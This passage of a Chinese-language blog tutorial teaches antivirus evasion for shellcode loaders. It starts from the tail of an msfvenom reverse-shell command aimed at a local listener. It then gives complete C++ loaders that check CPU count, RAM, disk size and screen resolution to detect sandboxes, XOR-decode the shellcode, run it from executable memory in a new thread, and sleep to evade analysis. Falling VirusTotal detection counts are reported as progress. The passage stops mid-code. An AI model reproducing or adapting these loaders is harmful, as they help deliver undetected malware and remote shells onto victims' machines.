class="string">&#x27;\x00&#x27;</span> lhost=192.168.0.161 lport=6666   -f c</span><br></pre></td></tr></table></figure><p>接着重复上面两个步骤编译出来的程序放到TV中查杀下，可以发现免杀瞬间绕过了10个杀软，免杀率<strong>9/72</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/61.png?raw=true" alt="image-20200521170347146"></p><h4 id="对ico图标进行更换"><a href="#对ico图标进行更换" class="headerlink" title="对ico图标进行更换"></a>对ico图标进行更换</h4><p>替换资源文件，有些杀软还会检查你的ico图标</p><h4 id="检测设备和供应商名称"><a href="#检测设备和供应商名称" class="headerlink" title="检测设备和供应商名称"></a>检测设备和供应商名称</h4><h5 id="硬件大小检测"><a href="#硬件大小检测" class="headerlink" title="硬件大小检测"></a>硬件大小检测</h5><p>一般的电脑现在都是最少4G内存了，硬盘最少都是500G的，CPU核心数都是2个以上，而反观虚拟机上的大部分都是分配个双核，2G内存，60G硬盘</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM_INFO SystemInfo;</span><br><span class="line">GetSystemInfo(&amp;SystemInfo);<span class="comment">//获取系统信息</span></span><br><span class="line">DWORD NumberOfProcessors = SystemInfo.dwNumberOfProcessors;</span><br><span class="line"><span class="keyword">if</span> (NumberOfProcessors &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; NumberOfProcessors&lt;&lt;std::endl;</span></span><br><span class="line"><span class="comment">// check RAM</span></span><br><span class="line">MEMORYSTATUSEX MemoryStatus;</span><br><span class="line">MemoryStatus.dwLength = <span class="keyword">sizeof</span>(MemoryStatus);</span><br><span class="line">GlobalMemoryStatusEx(&amp;MemoryStatus);</span><br><span class="line">DWORD RAMMB = MemoryStatus.ullTotalPhys / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; RAMMB &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (RAMMB &lt; <span class="number">2048</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check HDD</span></span><br><span class="line">HANDLE hDevice = CreateFileW(<span class="string">L&quot;\\.\PhysicalDrive0&quot;</span>, <span class="number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">DISK_GEOMETRY pDiskGeometry;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line">DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;pDiskGeometry, <span class="keyword">sizeof</span>(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)<span class="literal">NULL</span>);</span><br><span class="line">DWORD diskSizeGB;</span><br><span class="line">diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / <span class="number">1024</span> / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; diskSizeGB &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (diskSizeGB &lt; <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用检测基础硬件来绕过，发现可以再次绕过三家杀软，免杀率<strong>6/72</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/62.png?raw=true" alt="image-20200521180734265"></p><p>完整代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//windows控制台程序不出黑窗口</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">SYSTEM_INFO SystemInfo;</span><br><span class="line">GetSystemInfo(&amp;SystemInfo);<span class="comment">//获取系统信息</span></span><br><span class="line">DWORD NumberOfProcessors = SystemInfo.dwNumberOfProcessors;</span><br><span class="line"><span class="keyword">if</span> (NumberOfProcessors &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; NumberOfProcessors&lt;&lt;std::endl;</span></span><br><span class="line"><span class="comment">// check RAM</span></span><br><span class="line">MEMORYSTATUSEX MemoryStatus;</span><br><span class="line">MemoryStatus.dwLength = <span class="keyword">sizeof</span>(MemoryStatus);</span><br><span class="line">GlobalMemoryStatusEx(&amp;MemoryStatus);</span><br><span class="line">DWORD RAMMB = MemoryStatus.ullTotalPhys / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; RAMMB &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (RAMMB &lt; <span class="number">2048</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check HDD</span></span><br><span class="line">HANDLE hDevice = CreateFileW(<span class="string">L&quot;\\.\PhysicalDrive0&quot;</span>, <span class="number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">DISK_GEOMETRY pDiskGeometry;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line">DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;pDiskGeometry, <span class="keyword">sizeof</span>(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)<span class="literal">NULL</span>);</span><br><span class="line">DWORD diskSizeGB;</span><br><span class="line">diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / <span class="number">1024</span> / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; diskSizeGB &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (diskSizeGB &lt; <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;X64shellcode&quot;</span>;</span><br><span class="line">    LPVOID Memory;</span><br><span class="line"></span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对上面代码的shellcode进行异或加密后，在执行的时候解密再次绕过三家杀软，免杀率<strong>3/72</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/63.png?raw=true" alt="image-20200522163852141"></p><p>具体代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//windows控制台程序不出黑窗口</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">SYSTEM_INFO SystemInfo;</span><br><span class="line">GetSystemInfo(&amp;SystemInfo);<span class="comment">//获取系统信息</span></span><br><span class="line">DWORD NumberOfProcessors = SystemInfo.dwNumberOfProcessors;</span><br><span class="line"><span class="keyword">if</span> (NumberOfProcessors &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; NumberOfProcessors&lt;&lt;std::endl;</span></span><br><span class="line"><span class="comment">// check RAM</span></span><br><span class="line">MEMORYSTATUSEX MemoryStatus;</span><br><span class="line">MemoryStatus.dwLength = <span class="keyword">sizeof</span>(MemoryStatus);</span><br><span class="line">GlobalMemoryStatusEx(&amp;MemoryStatus);</span><br><span class="line">DWORD RAMMB = MemoryStatus.ullTotalPhys / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; RAMMB &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (RAMMB &lt; <span class="number">2048</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check HDD</span></span><br><span class="line">HANDLE hDevice = CreateFileW(<span class="string">L&quot;\\.\PhysicalDrive0&quot;</span>, <span class="number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">DISK_GEOMETRY pDiskGeometry;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line">DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;pDiskGeometry, <span class="keyword">sizeof</span>(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)<span class="literal">NULL</span>);</span><br><span class="line">DWORD diskSizeGB;</span><br><span class="line">diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / <span class="number">1024</span> / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; diskSizeGB &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (diskSizeGB &lt; <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;X64异或后的代码&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">    shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 增加异或代码 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++) &#123;</span><br><span class="line">        buf[i] ^= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">        <span class="comment">//原来的属性是PAGE_EXECUTE_READWRITE</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">    CopyMemory(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">    Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">    hThread = CreateThread(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再努努力绕过绕过全球杀软指日可待</p><h5 id="硬件名称检测"><a href="#硬件名称检测" class="headerlink" title="硬件名称检测"></a>硬件名称检测</h5><h5 id="特殊的注册列表"><a href="#特殊的注册列表" class="headerlink" title="特殊的注册列表"></a>特殊的注册列表</h5><h5 id="父进程"><a href="#父进程" class="headerlink" title="父进程"></a>父进程</h5><h5 id="特殊的进程"><a href="#特殊的进程" class="headerlink" title="特殊的进程"></a>特殊的进程</h5><h5 id="已加载的库"><a href="#已加载的库" class="headerlink" title="已加载的库"></a>已加载的库</h5><h5 id="窗口名称"><a href="#窗口名称" class="headerlink" title="窗口名称"></a>窗口名称</h5><h4 id="检查屏幕分辨率"><a href="#检查屏幕分辨率" class="headerlink" title="检查屏幕分辨率"></a>检查屏幕分辨率</h4><p>虚拟化环境很少使用多个显示器（尤其是沙箱）。虚拟显示器可能也没有特定的屏幕尺寸（尤其是处于自适应主机而不是全屏模式的时候，这时虚拟机窗口有滚动条或者选项卡），而有些沙箱甚至没有屏幕。</p><p>基于检测设备大小上面在加个检测分辨率</p><p>具体代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;devguid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;User32.lib &quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//windows控制台程序不出黑窗口</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查硬件是否正常</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">HardwareCapacity</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SYSTEM_INFO SystemInfo;</span><br><span class="line">    GetSystemInfo(&amp;SystemInfo);<span class="comment">//获取系统信息</span></span><br><span class="line">    DWORD NumberOfProcessors = SystemInfo.dwNumberOfProcessors;</span><br><span class="line">    <span class="keyword">if</span> (NumberOfProcessors &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; NumberOfProcessors&lt;&lt;std::endl;</span></span><br><span class="line">    <span class="comment">// check RAM</span></span><br><span class="line">    MEMORYSTATUSEX MemoryStatus;</span><br><span class="line">    MemoryStatus.dwLength = <span class="keyword">sizeof</span>(MemoryStatus);</span><br><span class="line">    GlobalMemoryStatusEx(&amp;MemoryStatus);</span><br><span class="line">    DWORD RAMMB = MemoryStatus.ullTotalPhys / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; RAMMB &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="keyword">if</span> (RAMMB &lt; <span class="number">2048</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check HDD</span></span><br><span class="line">    HANDLE hDevice = CreateFileW(<span class="string">L&quot;\\.\PhysicalDrive0&quot;</span>, <span class="number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    DISK_GEOMETRY pDiskGeometry;</span><br><span class="line">    DWORD bytesReturned;</span><br><span class="line">    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;pDiskGeometry, <span class="keyword">sizeof</span>(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)<span class="literal">NULL</span>);</span><br><span class="line">    DWORD diskSizeGB;</span><br><span class="line">    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / <span class="number">1024</span> / <span class="number">1024</span> / <span class="number">1024</span>;</span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; diskSizeGB &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="keyword">if</span> (diskSizeGB &lt; <span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> CALLBACK <span class="title">MonitorInfoCallback</span><span class="params">(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MONITORINFO MonitorInfo;</span><br><span class="line">    MonitorInfo.cbSize = <span class="keyword">sizeof</span>(MONITORINFO);</span><br><span class="line">    GetMonitorInfoW(hMonitor, &amp;MonitorInfo);</span><br><span class="line">    <span class="keyword">int</span> iXResolution = MonitorInfo.rcMonitor.right - MonitorInfo.rcMonitor.left;</span><br><span class="line">    <span class="keyword">int</span> iYResolution = MonitorInfo.rcMonitor.top - MonitorInfo.rcMonitor.bottom;</span><br><span class="line">    <span class="keyword">if</span> (iXResolution &lt; <span class="number">0</span>) iXResolution = -iXResolution;</span><br><span class="line">    <span class="keyword">if</span> (iYResolution &lt; <span class="number">0</span>) iYResolution = -iYResolution;</span><br><span class="line">    <span class="comment">//这边匹配常见分辨率</span></span><br><span class="line">    <span class="keyword">if</span> ((iXResolution != <span class="number">1920</span> &amp;&amp; iXResolution != <span class="number">2560</span> &amp;&amp; iXResolution != <span class="number">1440</span>)</span><br><span class="line">        || (iYResolution != <span class="number">1080</span> &amp;&amp; iYResolution != <span class="number">1200</span> &amp;&amp; iYResolution != <span class="number">1600</span> &amp;&amp; iYResolution != <span class="number">900</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        *((BOOL*)data) = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查分辨率是否正常</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MonitorInfo</span><span class="params">()</span></span></span><br><span class="line"><span 